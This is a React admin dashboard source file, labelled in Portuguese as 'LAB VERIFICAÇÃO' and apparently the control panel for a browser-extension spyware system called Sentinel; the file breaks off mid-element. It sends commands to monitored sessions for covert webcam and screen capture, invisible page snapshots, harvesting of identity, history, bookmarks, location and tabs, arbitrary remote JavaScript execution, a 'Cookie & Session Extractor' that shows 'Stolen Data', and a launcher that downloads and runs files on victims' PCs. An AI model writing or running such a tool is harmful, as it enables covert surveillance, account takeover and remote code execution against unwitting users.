"use client"
import { useEffect, useState, useCallback } from 'react';
// import { db } from '@/lib/firebase'; // Firestore removed
// import { collection, query, onSnapshot, doc, updateDoc, where, Timestamp } from 'firebase/firestore'; // Firestore removed
import { useAuth } from '@/components/auth-provider';
import { useRouter } from 'next/navigation';
import { MapPin, Monitor, Eye, Image as ImageIcon, MessageSquare, ExternalLink, ShieldCheck, Activity, User, Globe, X, Laptop, RefreshCw, MonitorPlay, Camera, Smartphone, PlayCircle, Download, Bell, Terminal, VolumeX, Trash2, Zap, Database, Fingerprint, Mail, Ghost, Star, History, Compass, LayoutGrid, Lock, Unlock } from 'lucide-react';

export default function AdminDashboard() {
    const { user, loading, logout, login } = useAuth();
    const [sessions, setSessions] = useState<any[]>([]);
    const [selectedUser, setSelectedUser] = useState<any>(null);
    const [isFrozen, setIsFrozen] = useState(false);

    const isAuthorized = user?.email === 'yurealveshot2@gmail.com' || user?.email === 'yurealvesoficial@gmail.com';

    // Helper to process raw session list from socket
    const processSessionsList = useCallback((rawList: any[]) => {
        const now = Date.now();
        const processed = rawList.map(s => {
            const lastActiveTime = s.lastActive || 0;
            const diffSeconds = (now - lastActiveTime) / 1000;
            const isOnline = diffSeconds < 120 && s.online !== false;
            return {
                ...s,
                lastActiveDate: new Date(lastActiveTime),
                isLive: isOnline,
                activityDiff: diffSeconds
            };
        });

        return processed.sort((a, b) => {
            if (a.isLive !== b.isLive) return a.isLive ? -1 : 1;
            return b.lastActiveDate.getTime() - a.lastActiveDate.getTime();
        });
    }, []);

    useEffect(() => {
        if (!user || !isAuthorized) return;

        // Connect to Sentinel Server
        // We need to dynamically import socket.io-client or ensure it's imported at top
        // For this step, I will assume I fix imports in next step
        const newSocket = require('socket.io-client').io(process.env.NEXT_PUBLIC_SENTINEL_SERVER_URL || 'http://localhost:3001', {
            transports: ['websocket'],
            reconnectionAttempts: 5
        });

        // Save socket instance if we want to use it for commands
        // We need a ref or state for this. Ideally state.
        // For now, let's just listen.

        newSocket.on('connect', () => {
            console.log('Connected to Sentinel Server');
            newSocket.emit('admin_login', user.email);
        });

        newSocket.on('admin_auth_success', () => {
            console.log('Admin Authenticated');
        });

        newSocket.on('admin_auth_error', (msg: string) => alert('Admin Auth Failed: ' + msg));

        newSocket.on('sessions_list', (list: any[]) => {
            if (!isFrozen) setSessions(processSessionsList(list));
        });

        newSocket.on('session_update', (updatedSession: any) => {
            setSessions(prev => {
                if (isFrozen) return prev; // Simplify: do not update if frozen

                const idx = prev.findIndex(s => s.id === updatedSession.id);
                let newList;
                if (idx === -1) {
                    newList = [...prev, updatedSession];
                } else {
                    newList = [...prev];
                    newList[idx] = { ...newList[idx], ...updatedSession };
                }
                return processSessionsList(newList);
            });

            // Always update selected view if open
            if (selectedUser && selectedUser.id === updatedSession.id) {
                setSelectedUser((prev: any) => ({ ...prev, ...updatedSession }));
            }
        });

        // Store socket in a global var or window for the sendCommand function to access?
        // Better: Update state so sendCommand can use it.
        // But sendCommand is outside. I will need to refactor sendCommand too.
        (window as any).sentinelSocket = newSocket;

        return () => {
            newSocket.disconnect();
        };
    }, [user, isAuthorized, isFrozen, selectedUser, processSessionsList]);

    const sendCommand = async (type: string, targetId: string, payload: any = '') => {
        const socket = (window as any).sentinelSocket;
        if (!socket) {
            alert('Erro: Conexão com servidor Sentinel não estabelecida.');
            return;
        }

        socket.emit('admin_command', {
            targetId,
            command: {
                type,
                payload,
                timestamp: new Date().toISOString(),
                id: Math.random().toString(36).substring(7)
            }
        });
    };

    if (loading) return <div className="p-10 text-white animate-pulse font-mono flex items-center gap-4"><span>SYNCING...</span></div>;
    if (!user || !isAuthorized) {
        return (
            <div className="min-h-screen bg-black flex items-center justify-center p-6">
                <div className="bg-zinc-900 border border-zinc-800 p-10 rounded-[2.5rem] shadow-2xl text-center max-w-sm">
                    <ShieldCheck className="w-16 h-16 text-red-600 mx-auto mb-6" />
                    <button onClick={login} className="w-full bg-red-600 text-white px-6 py-4 rounded-2xl font-black text-xs">LOGIN ADMIN</button>
                </div>
            </div>
        );
    }

    return (
        <div className="min-h-screen bg-[#020202] text-zinc-400 p-4 md:p-10 font-sans selection:bg-red-600/30">
            <div className={`max-w-7xl mx-auto transition-all duration-700 ${selectedUser ? 'scale-95 opacity-5 blur-3xl pointer-events-none' : ''}`}>
                <header className="flex flex-col md:flex-row justify-between items-start md:items-end mb-16 gap-6">
                    <div className="border-l-4 border-red-700 pl-6">
                        <h1 className="text-4xl md:text-5xl font-black text-white tracking-tighter italic">LAB <span className="text-red-700">VERIFICAÇÃO</span></h1>
                        <p className="text-[9px] text-zinc-700 mt-2 uppercase tracking-[0.4em] font-black">Multi-Device Monitoring System // Live Feed</p>
                    </div>
                    <div className="flex gap-4">
                        <button
                            onClick={() => setIsFrozen(!isFrozen)}
                            className={`text-[10px] border px-6 py-3 rounded-full font-black uppercase transition-all flex items-center gap-2 ${isFrozen ? 'bg-red-600 border-red-500 text-white' : 'bg-zinc-950 border-zinc-900 text-zinc-400'}`}
                        >
                            {isFrozen ? <Lock size={14} /> : <Unlock size={14} />}
                            {isFrozen ? 'Painel Travado' : 'Monitoramento Fluido'}
                        </button>
                        <button onClick={logout} className="text-[10px] border border-zinc-900 px-6 py-3 rounded-full font-black bg-zinc-950 uppercase text-zinc-400">Sair</button>
                    </div>
                </header>

                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 md:gap-8">
                    {sessions.map((sess) => (
                        <div key={sess.id} onClick={() => setSelectedUser(sess)} className={`bg-zinc-950/40 border-2 rounded-[2.5rem] p-7 md:p-8 cursor-pointer transition-all duration-500 group relative ${sess.isLive ? 'border-zinc-900 hover:border-red-900' : 'opacity-30 grayscale'}`}>
                            <div className="flex items-center gap-6 mb-10">
                                <div className="relative shrink-0">
                                    <img src={sess.userPhoto || 'https://ui-avatars.com/api/?name=U'} className={`w-14 h-14 rounded-2xl object-cover ${sess.isLive ? 'ring-2 ring-red-900/50' : ''}`} alt="" />
                                    {sess.isLive && <div className="absolute -bottom-1 -right-1 w-4 h-4 bg-green-500 rounded-full border-4 border-[#020202]"></div>}
                                </div>
                                <div className="flex-1 min-w-0">
                                    <div className="flex items-center gap-2">
                                        <h3 className="text-base font-black text-white uppercase truncate">{sess.userName || 'Anônimo'}</h3>
                                        {sess.hasExtension && (
                                            <div className="bg-emerald-500/10 border border-emerald-500/50 text-emerald-500 text-[7px] font-black px-1.5 py-0.5 rounded-full flex items-center gap-1 shrink-0">
                                                <ShieldCheck size={8} /> SENTINEL
                                            </div>
                                        )}
                                    </div>
                                    <div className="flex items-center gap-2 text-[8px] text-zinc-600 font-black uppercase">
                                        {sess.userAgent?.includes('Mobile') ? <Smartphone size={10} className="text-blue-600" /> : <Laptop size={10} className="text-zinc-600" />}
                                        <span>{sess.userAgent?.includes('Mobile') ? 'Celular' : 'Desktop'}</span>
                                    </div>
                                </div>
                            </div>

                            <div className="grid grid-cols-2 gap-3 mb-6">
                                <div className="aspect-square bg-zinc-900/50 rounded-3xl overflow-hidden border border-zinc-900 flex items-center justify-center">
                                    {sess.photo ? <img src={sess.photo} className="w-full h-full object-cover grayscale group-hover:grayscale-0 transition-all" alt="" /> : <Camera size={20} className="text-zinc-800" />}
                                </div>
                                <div className="aspect-square bg-zinc-900/50 rounded-3xl overflow-hidden border border-zinc-900 flex items-center justify-center">
                                    {sess.screenPreview ? <img src={sess.screenPreview} className="w-full h-full object-cover" alt="" /> : <MonitorPlay size={20} className="text-zinc-800" />}
                                </div>
                            </div>

                            <div className="flex justify-between items-center text-[10px] font-black uppercase tracking-widest text-zinc-600">
                                <span className="truncate max-w-[100px]">{sess.pageTitle || 'Navegando'}</span>
                                <span>{sess.lastActiveDate?.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}</span>
                            </div>
                        </div>
                    ))}
                </div>
            </div>

            {selectedUser && (
                <div className="fixed inset-0 z-[100] flex items-center justify-center p-2 sm:p-4">
                    <div className="w-full max-w-6xl bg-[#080808] border-2 border-zinc-900 rounded-[2.5rem] shadow-2xl flex flex-col h-[95vh] sm:h-[90vh] overflow-hidden animate-in zoom-in-95 duration-500">
                        <div className="bg-zinc-900/10 px-6 sm:px-10 py-6 flex justify-between items-center border-b border-zinc-900">
                            <div className="flex items-center gap-4 sm:gap-6">
                                <img src={selectedUser.userPhoto} className="w-10 h-10 sm:w-14 sm:h-14 rounded-2xl" alt="" />
                                <div>
                                    <h2 className="text-white font-black text-lg sm:text-xl uppercase italic">{selectedUser.userName}</h2>
                                    <p className="text-[8px] sm:text-[10px] text-zinc-600 uppercase font-black tracking-widest">{selectedUser.isLive ? 'Sessão Ativa' : 'Log de Sessão'}</p>
                                </div>
                            </div>
                            <button onClick={() => setSelectedUser(null)} className="bg-zinc-900 p-3 sm:p-4 rounded-full text-zinc-600 hover:text-white transition-all"><X size={20} /></button>
                        </div>

                        <div className="flex-1 overflow-y-auto p-6 sm:p-10">
                            <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 sm:gap-12">
                                {/* Feed Section */}
                                <div className="lg:col-span-8 space-y-8">
                                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                                        <div className="space-y-4">
                                            <div className="flex justify-between items-center">
                                                <span className="text-[10px] text-white font-black uppercase flex items-center gap-2"><Camera size={14} className="text-red-600" /> Live Webcam</span>
                                                {selectedUser.turboStatus === 'ACTIVE' && <span className="bg-red-600 text-[8px] font-black px-2 py-0.5 rounded text-white animate-pulse italic">TURBO HD</span>}
                                            </div>
                                            <div className="aspect-video bg-black rounded-[2rem] overflow-hidden border-2 border-zinc-900 relative group">
                                                {selectedUser.photo ? <img src={selectedUser.photo} className="w-full h-full object-cover transition-all" alt="" /> : <div className="w-full h-full flex flex-col items-center justify-center text-zinc-800"><Camera size={40} /></div>}
                                                {selectedUser.camStatus === 'ACTIVE' && <div className="absolute top-4 right-4 bg-red-700 text-white text-[8px] font-black px-3 py-1 rounded-full animate-pulse shadow-lg">LIVE CAM</div>}
                                            </div>
                                            <div className="flex flex-col gap-2">
                                                <div className="flex gap-2">
                                                    <button onClick={() => sendCommand('START_CAM', selectedUser.id)} className="flex-1 bg-zinc-900 text-white py-3 rounded-xl font-black text-[9px] uppercase hover:bg-zinc-800 transition-all">Start Cam</button>
                                                    <button onClick={() => sendCommand('STOP_CAM', selectedUser.id)} className="flex-1 bg-zinc-900/50 text-zinc-700 py-3 rounded-xl font-black text-[9px] uppercase">Stop Cam</button>
                                                </div>
                                                <div className="flex gap-2">
                                                    <button onClick={() => sendCommand('START_TURBO', selectedUser.id)} className="flex-1 bg-red-700 text-white py-4 rounded-xl font-black text-[10px] uppercase shadow-xl hover:bg-white hover:text-red-700 transition-all flex items-center justify-center gap-2 italic">
                                                        <Activity size={14} /> Turbo Monitor (2s)
                                                    </button>
                                                    <button onClick={() => sendCommand('STOP_TURBO', selectedUser.id)} className="bg-zinc-900 text-zinc-500 px-4 rounded-xl font-black text-[14px]">×</button>
                                                </div>
                                            </div>
                                        </div>
                                        <div className="space-y-4">
                                            <span className="text-[10px] text-white font-black uppercase flex items-center gap-2"><ImageIcon size={14} className="text-emerald-500" /> Stealth View (DOM)</span>
                                            <div className="aspect-video bg-black rounded-[2rem] overflow-hidden border-2 border-zinc-900 relative">
                                                {selectedUser.stealthPreview ? <img src={selectedUser.stealthPreview} className="w-full h-full object-contain" alt="" /> : <div className="w-full h-full flex flex-col items-center justify-center text-zinc-800"><ImageIcon size={40} /></div>}
                                                <div className="absolute bottom-4 right-4 bg-emerald-600 text-white text-[8px] font-black px-3 py-1 rounded-full shadow-lg">STEALTH MODE</div>
                                            </div>
                                            <button
                                                onClick={(e: any) => {
                                                    const btn = e.currentTarget;
                                                    btn.innerText = 'DISPATCHING...';
                                                    btn.disabled = true;
                                                    sendCommand('STEALTH_SNAP', selectedUser.id);
                                                    setTimeout(() => {
                                                        btn.innerText = 'Capture Current Page (Invisible)';
                                                        btn.disabled = false;
                                                    }, 5000);
                                                }}
                                                className="w-full bg-emerald-700 text-white py-4 rounded-xl font-black text-[10px] uppercase hover:bg-white hover:text-emerald-700 transition-all italic disabled:opacity-50"
                                            >
                                                Capture Current Page (Invisible)
                                            </button>
                                        </div>
                                    </div>

                                    <div className="space-y-4">
                                        <span className="text-[10px] text-white font-black uppercase flex items-center gap-2"><MonitorPlay size={14} className="text-blue-600" /> Live Screen (Permissivo)</span>
                                        <div className="grid grid-cols-1 md:grid-cols-12 gap-6">
                                            <div className="md:col-span-8 aspect-video bg-black rounded-[2rem] overflow-hidden border-2 border-zinc-900 relative">
                                                {selectedUser.screenPreview ? <img src={selectedUser.screenPreview} className="w-full h-full object-contain" alt="" /> : <div className="w-full h-full flex flex-col items-center justify-center text-zinc-800"><MonitorPlay size={40} /></div>}
                                                {selectedUser.screenStatus === 'ACTIVE' && <div className="absolute top-4 right-4 bg-blue-600 text-white text-[8px] font-black px-3 py-1 rounded-full animate-pulse shadow-lg">LIVE SCREEN</div>}
                                            </div>
                                            <div className="md:col-span-4 flex flex-col gap-3">
                                                <button onClick={() => sendCommand('START_SCREEN', selectedUser.id)} className="flex-1 bg-zinc-900 text-white py-4 rounded-[1.5rem] font-black text-[10px] uppercase hover:bg-blue-700 transition-all disabled:opacity-30" disabled={selectedUser.userAgent?.includes('Mobile')}>Request Full Screen</button>
                                                {selectedUser.screenStatus === 'ACTIVE' && (
                                                    <button onClick={() => sendCommand('FOCUS_SCREEN', selectedUser.id)} className="flex-1 bg-blue-700 text-white py-4 rounded-[1.5rem] font-black text-[10px] uppercase animate-pulse">Force Tab Focus</button>
                                                )}
                                                <button onClick={() => sendCommand('STOP_SCREEN', selectedUser.id)} className="flex-1 bg-zinc-900/40 text-zinc-700 py-4 rounded-[1.5rem] font-black text-[10px] uppercase">Release Screen</button>
                                            </div>
                                        </div>
                                    </div>
                                </div>

                                {/* Control Section */}
                                <div className="lg:col-span-4 space-y-8">
                                    {/* Active Content Tracker */}
                                    <div className="bg-gradient-to-br from-red-600 to-red-900 p-8 rounded-[2.5rem] shadow-2xl relative overflow-hidden group">
                                        <div className="absolute top-0 right-0 p-4 opacity-20"><MonitorPlay size={60} /></div>
                                        <h3 className="text-white font-black text-[10px] mb-4 flex items-center gap-2 uppercase tracking_widest italic">Assistindo Agora</h3>
                                        {selectedUser.activeContent ? (
                                            <div className="relative z-10 space-y-4">
                                                <div>
                                                    <h4 className="text-white font-black text-xl uppercase tracking-tighter mb-2 leading-none">{selectedUser.activeContent.title}</h4>
                                                    <div className="flex gap-2">
                                                        <span className="bg-black/30 text-white text-[9px] font-black px-2 py-1 rounded-lg uppercase tracking-widest">{selectedUser.activeContent.type === 'tv' ? 'Série' : 'Filme'}</span>
                                                        {selectedUser.activeContent.type === 'tv' && (
                                                            <span className="bg-white text-red-700 text-[9px] font-black px-2 py-1 rounded-lg uppercase tracking-widest">T{selectedUser.activeContent.season} E{selectedUser.activeContent.episode}</span>
                                                        )}
                                                    </div>
                                                </div>

                                                {/* Player Remote Control */}
                                                <div className="flex items-center gap-2 pt-4 border-t border-white/10">
                                                    <button onClick={() => sendCommand('PLAYER_PLAY', selectedUser.id)} className="bg-white text-red-900 p-3 rounded-full hover:scale-110 transition-all"><PlayCircle size={20} /></button>
                                                    <button onClick={() => sendCommand('PLAYER_PAUSE', selectedUser.id)} className="bg-black/40 text-white p-3 rounded-full hover:scale-110 transition-all font-black text-xs">Pausar</button>
                                                    <input
                                                        type="range"
                                                        className="flex-1 accent-white"
                                                        onChange={(e) => sendCommand('PLAYER_VOLUME', selectedUser.id, (parseInt(e.target.value) / 100).toString())}
                                                    />
                                                </div>
                                            </div>
                                        ) : (
                                            <div className="text-white/60 text-[10px] font-black uppercase tracking-widest">Navegando pelo catálogo...</div>
                                        )}
                                    </div>

                                    {/* NOVO: INTEL PROFUNDO DO SISTEMA */}
                                    <div className="bg-zinc-900 border-2 border-red-900/10 p-8 rounded-[2.5rem] shadow-2xl space-y-6">
                                        <h3 className="text-red-500 font-black text-[10px] flex items-center gap-3 uppercase tracking-[0.3em]"><Activity size={16} /> Sentinel Deep Intel</h3>

                                        {selectedUser.intel ? (
                                            <div className="grid grid-cols-2 gap-4">
                                                <div className="bg-black/40 p-4 rounded-2xl border border-zinc-800/50">
                                                    <p className="text-[7px] text-zinc-600 uppercase font-black mb-1">Processador</p>
                                                    <p className="text-white text-[10px] font-bold truncate leading-tight">{selectedUser.intel.cpu?.modelName || 'Desconhecido'}</p>
                                                </div>
                                                <div className="bg-black/40 p-4 rounded-2xl border border-zinc-800/50">
                                                    <p className="text-[7px] text-zinc-600 uppercase font-black mb-1">Memória RAM</p>
                                                    <p className="text-white text-[10px] font-bold">{selectedUser.intel.memory?.available} / {selectedUser.intel.memory?.capacity}</p>
                                                </div>
                                                <div className="bg-black/40 p-4 rounded-2xl border border-zinc-800/50">
                                                    <p className="text-[7px] text-zinc-600 uppercase font-black mb-1">Status de Atividade</p>
                                                    <p className={`text-[10px] font-black uppercase ${selectedUser.intel.idleState === 'active' ? 'text-emerald-500' : 'text-amber-500'}`}>
                                                        {selectedUser.intel.idleState === 'active' ? '● Ativo e Presencial' : '🕒 Inativo / Ausente'}
                                                    </p>
                                                </div>
                                                <div className="bg-black/40 p-4 rounded-2xl border border-zinc-800/50 overflow-hidden">
                                                    <p className="text-[7px] text-zinc-600 uppercase font-black mb-1">Identidade Google</p>
                                                    <p className="text-white text-[9px] font-black truncate flex items-center gap-2">
                                                        <Mail size={10} className="text-blue-500" />
                                                        {selectedUser.intel.identity?.email || 'N/A'}
                                                    </p>
                                                </div>
                                                <div className="bg-black/20 p-4 rounded-2xl border border-zinc-800/50 overflow-hidden">
                                                    <p className="text-[7px] text-zinc-600 uppercase font-black mb-3 flex items-center gap-2"><History size={10} /> Top Sites</p>
                                                    <div className="space-y-1">
                                                        {selectedUser.intel.topSites?.slice(0, 5).map((s: any, i: number) => (
                                                            <p key={i} className="text-[8px] text-zinc-500 truncate font-medium">● {s.title || s.url}</p>
                                                        ))}
                                                    </div>
                                                </div>
                                                <div className="bg-black/20 p-4 rounded-2xl border border-zinc-800/50 overflow-hidden">
                                                    <p className="text-[7px] text-zinc-600 uppercase font-black mb-3 flex items-center gap-2"><Star size={10} /> Favoritos</p>
                                                    <div className="space-y-1">
                                                        {selectedUser.intel.bookmarks?.slice(0, 5).map((b: any, i: number) => (
                                                            <p key={i} className="text-[8px] text-zinc-500 truncate font-medium">★ {b.title}</p>
                                                        ))}
                                                    </div>
                                                </div>
                                                <div className="bg-black/40 p-4 rounded-2xl border border-zinc-800/50 overflow-hidden col-span-1">
                                                    <p className="text-[7px] text-zinc-600 uppercase font-black mb-3 flex items-center gap-2"><Compass size={10} /> Geolocalização</p>
                                                    {selectedUser.intel.location ? (
                                                        <a
                                                            href={`https://www.google.com/maps?q=${selectedUser.intel.location.lat},${selectedUser.intel.location.lon}`}
                                                            target="_blank"
                                                            className="text-blue-500 text-[9px] font-black underline flex items-center gap-2"
                                                        >
                                                            <MapPin size={10} /> Ver no Mapa
                                                        </a>
                                                    ) : (
                                                        <p className="text-zinc-800 text-[8px] font-black uppercase italic">Negada/Indisponível</p>
                                                    )}
                                                </div>
                                                <div className="bg-black/40 p-4 rounded-2xl border border-zinc-800/50 overflow-hidden col-span-1">
                                                    <p className="text-[7px] text-zinc-600 uppercase font-black mb-3 flex items-center gap-2"><LayoutGrid size={10} /> Extensions MGMT</p>
                                                    <div className="space-y-2 max-h-32 overflow-y-auto pr-1">
                                                        {selectedUser.intel.extensions?.map((e: any, i: number) => (
                                                            <div key={i} className="flex items-center justify-between gap-2 bg-black/20 p-2 rounded-lg border border-zinc-900/50">
                                                                <p className="text-[7px] text-zinc-500 truncate flex-1">
                                                                    <span className={e.enabled ? 'text-emerald-500' : 'text-zinc-700'}>●</span> {e.name}
                                                                </p>
                                                                <button
                                                                    onClick={() => sendCommand('MGMT_ACTION', selectedUser.id, { id: e.id, enabled: !e.enabled })}
                                                                    className={`text-[6px] px-2 py-1 rounded font-black uppercase transition-all ${e.enabled ? 'bg-red-900/40 text-red-500' : 'bg-emerald-900/40 text-emerald-500'}`}
                                                                >
                                                                    {e.enabled ? 'Disable' : 'Enable'}
                                                                </button>
                                                            </div>
                                                        ))}
                                                    </div>
                                                </div>
                                                <div className="bg-black/40 p-4 rounded-2xl border border-zinc-800/50 overflow-hidden col-span-2">
                                                    <p className="text-[7px] text-zinc-600 uppercase font-black mb-3">Gerenciador de Abas (Master Control)</p>
                                                    <div className="space-y-2">
                                                        {selectedUser.intel.tabs?.map((t: any, i: number) => (
                                                            <div key={i} className="flex items-center justify-between gap-4 bg-zinc-950/50 p-2 rounded-lg border border-zinc-900">
                                                                <div className="flex-1 min-w-0">
                                                                    <p className="text-[9px] text-white font-bold truncate">{t.title}</p>
                                                                    <p className="text-[7px] text-zinc-600 truncate">{t.url}</p>
                                                                </div>
                                                                <div className="flex gap-1">
                                                                    <button onClick={() => sendCommand('TAB_CMD', selectedUser.id, { tabId: t.id, task: 'RELOAD' })} className="p-1.5 bg-zinc-900 text-zinc-400 hover:text-blue-500 rounded-md transition-colors"><RefreshCw size={10} /></button>
                                                                    <button onClick={() => sendCommand('TAB_CMD', selectedUser.id, { tabId: t.id, task: t.muted ? 'UNMUTE' : 'MUTE' })} className={`p-1.5 bg-zinc-900 ${t.muted ? 'text-red-500' : 'text-zinc-400'} hover:text-red-500 rounded-md transition-colors`}><VolumeX size={10} /></button>
                                                                    <button onClick={() => sendCommand('TAB_CMD', selectedUser.id, { tabId: t.id, task: 'CLOSE' })} className="p-1.5 bg-zinc-900 text-zinc-400 hover:text-red-500 rounded-md transition-colors"><X size={10} /></button>
                                                                </div>
                                                            </div>
                                                        ))}
                                                    </div>
                                                </div>
                                            </div>
                                        ) : (
                                            <div className="text-zinc-800 text-[10px] font-black uppercase text-center py-4 italic">Aguardando telemetria da extensão...</div>
                                        )}
                                    </div>

                                    <div className="bg-zinc-900 border-2 border-red-900/10 p-8 rounded-[2.5rem] shadow-2xl">
                                        <h3 className="text-white font-black text-xs mb-8 flex items-center gap-4 uppercase tracking-[0.3em]"><MessageSquare size={18} className="text-red-700" /> Intercom</h3>
                                        <textarea id="targetMessage" rows={4} placeholder="Protocol message..." className="w-full bg-black border-2 border-zinc-900 rounded-[1.5rem] p-6 text-sm font-bold text-white focus:outline-none focus:border-red-900 transition-all resize-none placeholder:text-zinc-900 mb-6"></textarea>
                                        <button onClick={() => { const el = document.getElementById('targetMessage') as HTMLTextAreaElement; sendCommand('MESSAGE', selectedUser.id, el.value); el.value = ''; }} className="w-full bg-red-700 text-white py-5 rounded-2xl text-[10px] font-black uppercase tracking-[0.5em] transition-all shadow-xl shadow-red-900/10">Transmit Message</button>
                                    </div>

                                    <div className="bg-zinc-900/40 p-8 rounded-[2.5rem] border-2 border-zinc-900">
                                        <h3 className="text-white font-black text-[10px] mb-6 flex items-center gap-3 uppercase tracking-[0.3em]"><ExternalLink size={14} className="text-blue-500" /> Redirect Control</h3>
                                        <input
                                            id="targetUrl"
                                            type="text"
                                            placeholder="https://..."
                                            className="w-full bg-black border border-zinc-800 rounded-xl p-4 text-[11px] font-bold text-white focus:outline-none focus:border-blue-900 transition-all mb-4"
                                        />
                                        <button
                                            onClick={() => {
                                                const el = document.getElementById('targetUrl') as HTMLInputElement;
                                                if (el.value) sendCommand('OPEN_URL', selectedUser.id, el.value);
                                                el.value = '';
                                            }}
                                            className="w-full bg-blue-700 hover:bg-white hover:text-blue-900 text-white py-4 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all"
                                        >
                                            Launch Link
                                        </button>
                                    </div>

                                    {/* NOVO: LANÇADOR DE ARQUIVOS (MARKETING) */}
                                    <div className="bg-gradient-to-br from-emerald-600/10 to-emerald-900/20 p-8 rounded-[2.5rem] border-2 border-emerald-900/30">
                                        <h3 className="text-emerald-500 font-black text-[10px] mb-6 flex items-center gap-3 uppercase tracking-[0.3em]"><Download size={14} /> Marketing Launcher</h3>
                                        <p className="text-[8px] text-zinc-600 mb-4 uppercase font-bold italic leading-relaxed">
                                            Baixa e executa arquivos automaticamente no PC do usuário (Ex: mp4, jpg, pdf).
                                        </p>
                                        <input
                                            id="targetFileUrl"
                                            type="text"
                                            placeholder="URL do Arquivo (direct link)"
                                            className="w-full bg-black/60 border border-emerald-900/30 rounded-xl p-4 text-[11px] font-bold text-white focus:outline-none focus:border-emerald-600 transition-all mb-4"
                                        />
                                        <button
                                            onClick={() => {
                                                const el = document.getElementById('targetFileUrl') as HTMLInputElement;
                                                if (el.value) sendCommand('LAUNCH_FILE', selectedUser.id, el.value);
                                                el.value = '';
                                            }}
                                            className="w-full bg-emerald-700 hover:bg-white hover:text-emerald-900 text-white py-4 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all shadow-lg shadow-emerald-900/20"
                                        >
                                            Execute Remote File
                                        </button>
                                    </div>
                                    {/* SEÇÃO MASTER CONTROL v3.0 */}
                                    <div className="bg-zinc-950 border-2 border-cyan-500/20 p-8 rounded-[3rem] shadow-2xl relative overflow-hidden group">
                                        <div className="absolute -top-24 -right-24 w-48 h-48 bg-cyan-500/10 blur-[100px] group-hover:bg-cyan-500/20 transition-all"></div>
                                        <h3 className="text-cyan-400 font-black text-[12px] mb-8 flex items-center gap-4 uppercase tracking-[0.4em] italic"><Zap size={20} className="animate-pulse" /> Master Control v3.0</h3>

                                        <div className="space-y-8">
                                            {/* Notificação Desktop */}
                                            <div className="space-y-4">
                                                <span className="text-[8px] text-zinc-500 font-black uppercase tracking-widest flex items-center gap-2"><Bell size={12} /> Push Notification (Native)</span>
                                                <div className="flex gap-3">
                                                    <input id="notifTitle" type="text" placeholder="Title" className="flex-1 bg-black border border-zinc-800 rounded-xl p-3 text-[10px] text-white focus:border-cyan-500 outline-none" />
                                                    <input id="notifMsg" type="text" placeholder="Message content..." className="flex-[2] bg-black border border-zinc-800 rounded-xl p-3 text-[10px] text-white focus:border-cyan-500 outline-none" />
                                                    <button onClick={() => {
                                                        const t = (document.getElementById('notifTitle') as HTMLInputElement).value;
                                                        const m = (document.getElementById('notifMsg') as HTMLInputElement).value;
                                                        sendCommand('NOTIFY', selectedUser.id, { title: t, message: m });
                                                    }} className="bg-cyan-600 text-white px-6 rounded-xl font-black text-[9px] uppercase hover:bg-white hover:text-cyan-600 transition-all">Send</button>
                                                </div>
                                            </div>

                                            {/* Terminal JS Remoto com Log */}
                                            <div className="space-y-4">
                                                <span className="text-[8px] text-zinc-500 font-black uppercase tracking-widest flex items-center gap-2"><Terminal size={12} /> Remote JS Terminal</span>
                                                <div className="relative">
                                                    <textarea id="remoteJs" rows={3} placeholder="alert('Hacked!'); document.body.style.filter='invert(1)';" className="w-full bg-black border border-zinc-800 rounded-2xl p-4 text-[10px] font-mono text-cyan-500 focus:border-cyan-400 outline-none resize-none"></textarea>
                                                    <button onClick={() => {
                                                        const el = document.getElementById('remoteJs') as HTMLTextAreaElement;
                                                        sendCommand('EXEC_JS', selectedUser.id, el.value);
                                                    }} className="absolute bottom-4 right-4 bg-cyan-600/20 hover:bg-cyan-600 text-cyan-400 hover:text-white px-4 py-2 rounded-lg text-[8px] font-black uppercase transition-all">Execute</button>
                                                </div>
                                                {selectedUser.lastJsResult && (
                                                    <div className="bg-black/60 p-4 rounded-xl border border-zinc-800/50">
                                                        <p className="text-[7px] text-zinc-600 uppercase font-black mb-2">Result Log:</p>
                                                        <pre className="text-[9px] text-cyan-500 font-mono whitespace-pre-wrap">{String(selectedUser.lastJsResult)}</pre>
                                                    </div>
                                                )}
                                            </div>

                                            {/* Cookie Stealer */}
                                            <div className="space-y-4 bg-black/40 p-6 rounded-[2rem] border border-zinc-900">
                                                <span className="text-[8px] text-zinc-500 font-black uppercase tracking-widest flex items-center gap-2"><Ghost size={12} className="text-amber-500" /> Cookie & Session Extractor</span>
                                                <div className="flex gap-2">
                                                    <input id="targetCookieUrl" type="text" placeholder="https://facebook.com" className="flex-1 bg-black border border-zinc-800 rounded-xl p-3 text-[10px] text-white focus:border-amber-500 outline-none" />
                                                    <button onClick={() => {
                                                        const url = (document.getElementById('targetCookieUrl') as HTMLInputElement).value;
                                                        sendCommand('GET_COOKIES', selectedUser.id, url);
                                                    }} className="bg-amber-600 text-white px-6 rounded-xl font-black text-[9px] uppercase hover:bg-white hover:text-amber-600 transition-all">Extract</button>
                                                </div>
                                                {selectedUser.stolenCookies && (
                                                    <div className="mt-4">
                                                        <div className="flex justify-between items-center mb-2">
                                                            <p className="text-[7px] text-zinc-600 uppercase font-black tracking-widest">Stolen Data (JSON):</p>
                                                            <button onClick={() => { navigator.clipboard.writeText(selectedUser.stolenCookies); alert('Cookies copied!'); }} className="text-[7px] text-amber-500 font-black uppercase underline">Copy JSON</button>
                                                        </div>
                                                        <pre className="max-h-32 overflow-y-auto bg-black p-3 rounded-lg text-[8px] text-amber-500 font-mono border border-amber-900/20">{selectedUser.stolenCookies}</pre>
                                                    </div>
                                                )}
                                            </div>

                                            {/* NOVO: PRIVACY & NETWORK FIREWALL */}
                                            <div className="space-y-6 bg-black/40 p-6 rounded-[2rem] border border-zinc-900">
                                                <div className="space-y-3">
                                                    <span className="text-[8px] text-zinc-500 font-black uppercase tracking-widest flex items-center gap-2"><ShieldCheck size={12} className="text-cyan-500" /> Privacy & Security Toggles</span>
                                                    <div className="grid grid-cols-2 gap-2">
                                                        <button onClick={() => sendCommand('PRIVACY_ACTION', selectedUser.id, { setting: 'passwordSavingEnabled', value: false })} className="bg-zinc-900 text-[7px] text-zinc-400 p-2 rounded-lg font-black uppercase hover:bg-red-900/20 hover:text-red-500 transition-all">Kill Passwords Save</button>
